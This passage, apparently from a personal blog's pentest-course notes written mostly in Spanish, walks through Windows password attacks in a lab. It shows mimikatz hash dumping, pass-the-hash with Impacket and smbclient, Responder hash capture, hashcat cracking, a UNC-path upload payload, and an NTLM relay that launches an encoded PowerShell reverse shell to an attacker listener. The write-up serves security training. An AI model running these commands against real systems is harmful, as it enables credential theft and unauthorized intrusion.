+<p>As an example, we supose that we have a GUI access to a Windows client under the credentials; gunther:password123!. The next thing we wanna do is try to elevate our privileges. So we check our permissions:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Users\gunther&gt; whoami /groups
+
+[...]   
+BUILTIN\Administrators  
+[...]
+</code></pre></div></div>
+
+<p>We see that we are part of the Administrator group, so we use ‘mimikatz’, we open a Powershell session as Administrator:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\system32&gt; C:\tools\mimikatz.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # token::elevate
+Token Id  : 0
+User name :
+SID name  : NT AUTHORITY\SYSTEM
+
+584     {0;000003e7} 1 D 38986          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+ -&gt; Impersonated !
+ * Process Token : {0;000adf0e} 2 F 1863421     FILES01\gunther S-1-5-21-1555802299-1328189896-734683769-1006   (15g,24p)       Primary
+ * Thread Token  : {0;000003e7} 1 D 1922712     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+
+mimikatz # lsadump::sam
+Domain : FILES01
+SysKey : 509cc0c46295a3eaf4c5c8eb6bf95db1
+Local SID : S-1-5-21-1555802299-1328189896-734683769
+
+SAMKey : 201b0e3078f2be635aaaa055ab5a7828
+
+RID  : 000001f4 (500)
+User : Administrator
+  Hash NTLM: 7a38310ea6f0027ee955abed1762964b
+
+[...]
+</code></pre></div></div>
+
+<p>Ahora que tenemos el NTLM hash de una cuenta con privilegios administrativos necesitamos herramientas</p>
+
+<ul>
+  <li><em>smbclient</em> for SMB enumeration.</li>
+  <li>from <em>impacket</em> library; psexec.py and wmiexec.py.</li>
+  <li><em>evil-winrm</em></li>
+  <li><em>mimikatz</em></li>
+</ul>
+
+<p>Vamos a usar el script psexec de la colección Impacket.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/usr/share/doc/python3-impacket/examples/psexec.py  -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.238.211
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.238.211.....
+[*] Found writable share ADMIN$
+[*] Uploading file emPsaVUx.exe
+[*] Opening SVCManager on 192.168.238.211.....
+[*] Creating service yYaL on 192.168.238.211.....
+[*] Starting service yYaL.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\flag.txt
+OS{a886856d0332b299b727c882686d321d}
+</code></pre></div></div>
+
+<p>También pdoemos utilizar el hash con smbclient para utilizarlo contra un share:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
+Try "help" to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Thu Jun  2 16:55:37 2022
+  ..                                DHS        0  Thu Jun  2 16:55:35 2022
+  secrets.txt                         A        4  Thu Jun  2 11:34:47 2022
+
+                4554239 blocks of size 4096. 771633 blocks available
+
+smb: \&gt; get secrets.txt
+getting file \secrets.txt of size 4 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+</code></pre></div></div>
+
+<p>También, queda el script wmiexec de también la colección Impacket:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] SMBv3.0 dialect used
+[!] Launching semi-interactive shell - Careful what you execute
+[!] Press help for extra shell commands
+C:\&gt;whoami
+files02\administrator
+
+C:\&gt;
+</code></pre></div></div>
+
+<h4 id="2123-cracking-net-ntlmv2-responder">21.2.3. Cracking Net-NTLMv2. Responder.</h4>
+
+<p>En muchas ocasiones en las que estemos realizando una prueba de penetración podemos llegar a obtener un RCE bajo un usuario sin privilegios y en ese caso no podemos utilizar Mimikatz para extraer hashes de contraseña.</p>
+
+<p>En contextos como este todavía podemos abusar de <em>Net-NTLMv2</em>, que se trata de un protocolo de autenticación de red responsable de manejar procesos de autenticación entre clientes Windows y servicios sobre la red y que se asume como la continuación del protocolo NTLM.</p>
+
+<p>Para hacer esto, necesitamos que el target inicie un proceso de autenticación usando Net-NTLMv2 contra un sistema que controlamos. Necesitamos preparar nuestro sistema para que maneje el proceso de autenticación y nos muestre el hash Net-NTLMv2 que se usó para la autenticación. Podemos hacer uso de la herramienta Responder. Incluye un servidor SMB incorporado que maneja el proceso de autenticación por nosotros e imprime todos los hashes Net-NTLMv2 capturados. Si bien también incluye otros servidores de protocolo (incluidos HTTP y FTP), así como <em>resolución de nombres de multidifusión local de vínculo</em> (LLMNR), <em>servicio de nombres NetBIOS</em> ( NBT-NS) y <em>DNS de multidifusión</em> (MDNS) capacidades de envenenamiento. En esta sección, nos centraremos en capturar hashes de Net-NTLMv2 con el servidor SMB.</p>
+
+<p>Si hemos obtenido RCE sobre el target podemos a través de PowerShell forzar esta conexión contra nuestro sistema con el comando:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ls \\&lt;Local-IP&gt;\share
+</code></pre></div></div>
+
+<p>Si no, todavía podemos forzar esta conexión. Por ejemplo, cuando descubrimos un formulario de subida de archivos en una aplicación web en un servidor de Windows, podemos intentar ingresar un archivo inexistente con una ruta UNC como \\&lt;Local-IP&gt;\share\nonexistent.txt. Si la aplicación web admite cargas a través de SMB, el servidor de Windows se autenticará en nuestro servidor SMB.</p>
+
+<p>Así, supongámos que hemos logrado instralar un backdoor en un cliente:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ nc 192.168.199.211 4444
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;
+</code></pre></div></div>
+
+<p>Accedemos al sistema y examinamos el contexto del usuario con el que hemos obtenido acceso:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name    SID                                          
+============ =============================================
+files01\paul S-1-5-21-1555802299-1328189896-734683769-1007
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                             Type             SID          Attributes                                        
+====================================== ================ ============ ==================================================
+Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Desktop Users           Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\BATCH                     Well-known group S-1-5-3      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                          Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
+LOCAL                                  Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level Label            S-1-16-8192                                                    
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+</code></pre></div></div>
+
+<p>Este usuario no forma parte del grupo de administradores pero sin embargo si forma parte del group RDP. Así, sería útil obtener sus credenciales.</p>
+
+<p>Para ello forzamos una autenticación remota sobre un servidor bajo nuestro control para capturar las credenciales:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\system32&gt;dir \\192.168.45.176\test
+dir \\192.168.45.176\test
+Access is denied.
+</code></pre></div></div>
+
+<p>En el comando anterior estamos intentando listar remotamente un directorio ‘test’ en una máquina cuya IP es 192.168.45.176, que es una máquina sobre la que tenemos control. En esta máquina además hemos activado la utilidad Responder:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -&gt; https://www.patreon.com/PythonResponder
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+[...]
+	SMB server                 [ON]
+[...]
++] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [192.168.45.176]
+    Responder IPv6             [fe80::9b22:19e:4e25:7f83]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+[...]
+[+] Listening for events...                                                                                         
+
+[SMB] NTLMv2-SSP Client   : 192.168.199.211
+[SMB] NTLMv2-SSP Username : FILES01\paul
+[SMB] NTLMv2-SSP Hash     : paul::FILES01:72d22da8b3aefa0e:C7D2976D1CEFF66576D613DC947E13EB:01010000000000000079719A9D84D9018050A47218BFB5230000000002000800590048004A00410001001E00570049004E002D0054005A0051004E00520032004300390039004B004C0004003400570049004E002D0054005A0051004E00520032004300390039004B004C002E00590048004A0041002E004C004F00430041004C0003001400590048004A0041002E004C004F00430041004C0005001400590048004A0041002E004C004F00430041004C00070008000079719A9D84D901060004000200000008003000300000000000000000000000002000007F1BD75BAE0FFDE594BCA74C62B4D3CB1656AEC27E52436EB09106E3AC6C5C580A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370036000000000000000000
+</code></pre></div></div>
+
+<p>Al intentar listar remotamente un directorio se ha forzado una autenticación remota que nuestro sistema ha capturado. Ahora tenemos el NTLM hash del usuario paul y podemos intentar crakearlo:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~/labs$ hashid paulhash.txt                                           
+--File 'hash.txt'--
+Analyzing 'paul::FILES01:72d22da8b3aefa0e:C7D2976D1CEFF66576D613DC947E13EB:01010000000000000079719A9D84D9018050A47218BFB5230000000002000800590048004A00410001001E00570049004E002D0054005A0051004E00520032004300390039004B004C0004003400570049004E002D0054005A0051004E00520032004300390039004B004C002E00590048004A0041002E004C004F00430041004C0003001400590048004A0041002E004C004F00430041004C0005001400590048004A0041002E004C004F00430041004C00070008000079719A9D84D901060004000200000008003000300000000000000000000000002000007F1BD75BAE0FFDE594BCA74C62B4D3CB1656AEC27E52436EB09106E3AC6C5C580A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100370036000000000000000000'
+[+] NetNTLMv2 
+--End of file 'hash.txt'--
+
+kali@kali:~/labs$ hashcat -h | grep -i NTLM
+   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
+  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+   1000 | NTLM                                                       | Operating System
+
+kali@kali:~/labs$ hashcat -m 5600  hash.txt /usr/share/wordlists/rockyou.txt --show
+PAUL::FILES01:72d22da8b3aefa0e:c7d2976d1ceff66576d613dc947e13eb:01010000000000000079719a9d84d9018050a47218bfb5230000000002000800590048004a00410001001e00570049004e002d0054005a0051004e00520032004300390039004b004c0004003400570049004e002d0054005a0051004e00520032004300390039004b004c002e00590048004a0041002e004c004f00430041004c0003001400590048004a0041002e004c004f00430041004c0005001400590048004a0041002e004c004f00430041004c00070008000079719a9d84d901060004000200000008003000300000000000000000000000002000007f1bd75bae0ffde594bca74c62b4d3cb1656aec27e52436eb09106e3ac6c5c580a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100370036000000000000000000:123Password123
+</code></pre></div></div>
+
+<p>Y con las credenciales podríamos tener acceso GUI que será más ventajoso.</p>
+
+<p><br /></p>
+
+<p><strong>2. Enumerate VM #2 and find a way to obtain a Net-NTLMv2 hash via the web application. Important: Add marketingwk01 to your /etc/hosts file with the corresponding IP address of the machine. After you have obtained the Net-NTLMv2 hash, crack it, and connect to the system to find the flag.</strong></p>
+
+<p>Accedemos a la web y encontramos una funcionalidad de subida de ficheros. Si el servidor está malconfigurado ( y es Windows) puede ser que esté diseñado para intentar recorger ficheros remotos a través de SMB. Así, capturamos una request a través de BurpSuite y plantamos un SMB path para obtener un fichero en nuestra máquina a través de SMB:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /upload HTTP/1.1
+Host: marketingwk01:8000
+Content-Length: 1621
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://marketingwk01:8000
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryAJo6OsdZi9RLo5RB
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.134 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://marketingwk01:8000/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+------WebKitFormBoundaryAJo6OsdZi9RLo5RB
+Content-Disposition: form-data; name="myFile"; filename="\\\\192.168.45.182\\cmdasp.aspx"
+
+Content-Type: application/octet-stream
+
+&lt;%@ Page Language="C#" Debug="true" Trace="false" %&gt;
+[...]
+</code></pre></div></div>
+
+<p>De esta forma, antes de enviar la request activamos el Responder:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ sudo responder -I tun0
+                                         __
+  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
+  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
+  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
+                   |__|
+
+           NBT-NS, LLMNR &amp; MDNS Responder 3.1.3.0
+
+  To support this project:
+  Patreon -&gt; https://www.patreon.com/PythonResponder
+  Paypal  -&gt; https://paypal.me/PythonResponder
+
+  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
+  To kill this script hit CTRL-C
+
+
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    MDNS                       [ON]
+    DNS                        [ON]
+    DHCP                       [OFF]
+
+[+] Servers:
+    HTTP server                [ON]
+    HTTPS server               [ON]
+    WPAD proxy                 [OFF]
+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [192.168.45.182]
+    Responder IPv6             [fe80::721b:7a6:66a5:1b44]
+    Challenge set              [random]
+    Don't Respond To Names     ['ISATAP']
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-PRHURFZ8003]
+    Responder Domain Name      [10MB.LOCAL]
+    Responder DCE-RPC Port     [49301]
+
+[+] Listening for events...              
+</code></pre></div></div>
+
+<p>Y enviamos la request, obteniendo unas credenciales:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[...]
+
+[+] Listening for events...                                                                                         
+
+[SMB] NTLMv2-SSP Client   : 192.168.221.210
+[SMB] NTLMv2-SSP Username : MARKETINGWK01\sam
+[SMB] NTLMv2-SSP Hash     : sam::MARKETINGWK01:d37530b4004ab302:A970DA03C0D2CF4CA627ED375321B0EB:010100000000000080C4B1FDD7ADD9012A4A6A863093BFC90000000002000800310030004D00420001001E00570049004E002D005000520048005500520046005A00380030003000330004003400570049004E002D005000520048005500520046005A0038003000300033002E00310030004D0042002E004C004F00430041004C0003001400310030004D0042002E004C004F00430041004C0005001400310030004D0042002E004C004F00430041004C000700080080C4B1FDD7ADD9010600040002000000080030003000000000000000000000000020000095498AE6D147C85F8F155846737A786170FD6550A4130037FA9A9EC493CE37BB0A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00340035002E003100380032000000000000000000                                                                           
+[*] Skipping previously captured hash for MARKETINGWK01\sam
+[*] Skipping previously captured hash for MARKETINGWK01\sam
+[*] Skipping previously captured hash for MARKETINGWK01\sam
+[*] Skipping previously captured hash for MARKETINGWK01\sam
+</code></pre></div></div>
+
+<p>Así, hemos obtenido un NTLMv2 hash y procedemos a crackearlo con Hashcat:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(kali㉿kali)-[~]
+└─$ hashcat -h | grep -i ntlmv2                                                                             
+   5600 | NetNTLMv2                                                  | Network Protocol
+  27100 | NetNTLMv2 (NT)                                             | Network Protocol
+                                                                                                                    
+┌──(kali㉿kali)-[~]
+└─$ hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt --show
+SAM::MARKETINGWK01:d37530b4004ab302:a970da03c0d2cf4ca627ed375321b0eb:010100000000000080c4b1fdd7add9012a4a6a863093bfc90000000002000800310030004d00420001001e00570049004e002d005000520048005500520046005a00380030003000330004003400570049004e002d005000520048005500520046005a0038003000300033002e00310030004d0042002e004c004f00430041004c0003001400310030004d0042002e004c004f00430041004c0005001400310030004d0042002e004c004f00430041004c000700080080c4b1fdd7add9010600040002000000080030003000000000000000000000000020000095498ae6d147c85f8f155846737a786170fd6550a4130037fa9a9ec493ce37bb0a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00340035002e003100380032000000000000000000:DISISMYPASSWORD
+</code></pre></div></div>
+
+<p><br /></p>
+
+<h4 id="2134-relaying-net-ntlmv2">21.3.4. Relaying Net-NTLMv2.</h4>
+
+<p>Puede darse el caso de que hayamos conseguido el hash de un usuario pero no podamos crackearlo debido a la complejidad del hash. En este caso todavía podemos realizar lo que se conoce como un <em>relay attack</em>.</p>
+
+<p>Este consiste en utilizar (una vez tenemos acceso a una máquina) el comando <em>dir</em> para crear una conexión SMB hacia nuestra kali que desviaremos hacia otra máquina para obtener permisos.</p>
+
+<p>Supongámos que tenemos acceso a FILE01 y FILE02, dos máquinas que comparten un usuario con las mismas credenciales. Entonces, en este contexto y suponiendo que las máquinas tienen desactivado el UAC o que el usuario en ambos casos comparten privilegios administrativos en ambas máquinas, podemos utilizar de la colección Impacket. Esta herramienta hace el trabajo pesado por nosotros al configurar un servidor SMB y transmitir la parte de autenticación de una conexión SMB entrante a un destino de nuestra elección.</p>
+
+<p>Usaremos <strong>–no-http-server</strong> para deshabilitar el servidor HTTP ya que estamos transmitiendo una conexión SMB y <strong>-smb2support</strong> para agregar soporte para <em>SMB2</em>. También usaremos <strong>-t</strong> para establecer el objetivo en FILES02. Finalmente, configuraremos nuestro comando con <strong>-c</strong> , que se ejecutará en el sistema de destino a tarvés el usuario redirigido. Usaremos un reverse shell de PowerShell de una sola línea, que codificaremos en base64 y ejecutaremos con <strong>-enc</strong> como lo hemos hecho antes en este curso. </p>
+
+<p>Debemos tener en cuenta que el reverse shell de PowerShell codificado en base64 se acorta en la siguiente lista, pero usa la IP de nuestra máquina Kali y el puerto 8080 para que se conecte el reverse shell.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+...
+[*] Protocol Client SMB loaded..
+[*] Protocol Client IMAPS loaded..
+[*] Protocol Client IMAP loaded..
+[*] Protocol Client HTTP loaded..
+[*] Protocol Client HTTPS loaded..
+[*] Running in relay mode to single host
+[*] Setting up SMB Server
+[*] Setting up WCF Server
+[*] Setting up RAW Server on port 6666
+
+[*] Servers started, waiting for connections
+</code></pre></div></div>
+
+<p>Activamos un listener para recoger la conexión:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$ nc -nvlp 8080 
+listening on [any] 8080 ...
+</code></pre></div></div>
+
+<p>Y mandamos la conexióon SMB desde la FILE01:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kali@kali:~$  nc 192.168.50.211 5555                                       
+Microsoft Windows [Version 10.0.20348.707]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+files01\files02admin
+
+C:\Windows\system32&gt;dir \\192.168.119.2\test
+...
+</code></pre></div></div>
+
+<p>La ntlmrelayx recibirá una conexión:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
+[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
+[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
+...
+[*] Executed specified command on host: 192.168.50.212
+</code></pre></div></div>
+
+<p>Y en nuestror servidor Netcat se abrirá una conexión:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
+whoami
+nt authority\system
+
+PS C:\Windows\system32&gt; hostname
+FILES02
+
+PS C:\Windows\system32&gt; ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
+   IPv4 Address. . . . . . . . . . . : 192.168.50.212
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 192.168.50.254
+</code></pre></div></div>
+
+<p><br /></p>
+
+<p><strong>2. Capstone Exercise: Find a way to obtain a Net-NTLMv2 hash from the user <em>anastasia</em> via the web application on VM #3 (BRUTE2) and relay it to VM #4 (FILES02).</strong></p>
+
+
+      </article>
+
+      
+        <div class="blog-tags">
+          <span>Tags:</span>
+          
+            <a href="/tags#pen">pen</a>
+          
+        </div>
+      
+
+      
+
+      
+        <!-- Check if any share-links are active -->
+
+
+
+
+<section id = "social-share-section">
+  <span class="sr-only">Share: </span>
+
+  
+    <a href="https://twitter.com/intent/tweet?text=Password+Attacks&url=http%3A%2F%2Flocalhost%3A4000%2F2023-11-13-13.Password_Attacks%2F"
+      class="btn btn-social-icon btn-twitter" title="Share on Twitter">
+      <span class="fab fa-fw fa-twitter" aria-hidden="true"></span>
+      <span class="sr-only">Twitter</span>
+    </a>
+  
+
+  
+    <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2F2023-11-13-13.Password_Attacks%2F"
+      class="btn btn-social-icon btn-facebook" title="Share on Facebook">
+      <span class="fab fa-fw fa-facebook" aria-hidden="true"></span>
+      <span class="sr-only">Facebook</span>
+    </a>
+  
+
+  
+    <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2F2023-11-13-13.Password_Attacks%2F"
+      class="btn btn-social-icon btn-linkedin" title="Share on LinkedIn">
+      <span class="fab fa-fw fa-linkedin" aria-hidden="true"></span>
+      <span class="sr-only">LinkedIn</span>
+    </a>
+  
+
+  
+
+  
+
+</section>
+
+
+
+      
+
+      <ul class="pagination blog-pager">
+        
+        <li class="page-item previous">
+          <a class="page-link" href="/2023-11-12-12.Active_Directory_Attacks/" data-toggle="tooltip" data-placement="top" title="Active Directory Attacks">&larr; Previous Post</a>
+        </li>
+        
+        
+        <li class="page-item next">
+          <a class="page-link" href="/2023-11-14-14.Metasploit/" data-toggle="tooltip" data-placement="top" title="Metasploit">Next Post &rarr;</a>
+        </li>
+        
+      </ul>
+      
+  
+  
+  
+
+  
+
+
+  
+
+
+
+    </div>
+  </div>
+</div>
+
+
+  <footer>
+  <div class="container-md beautiful-jekyll-footer">
+    <div class="row">
+      <div class="col-xl-8 offset-xl-2 col-lg-10 offset-lg-1">
+      <ul class="list-inline text-center footer-links"><li class="list-inline-item">
+    <a href="/feed.xml" title="RSS">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">RSS</span>
+    </a>
+  </li><li class="list-inline-item">
+    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/Qv1nTv5" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/Qvintvs1" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Qv1nTv5
+        &nbsp;&bull;&nbsp;
+      
+      2024
+
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
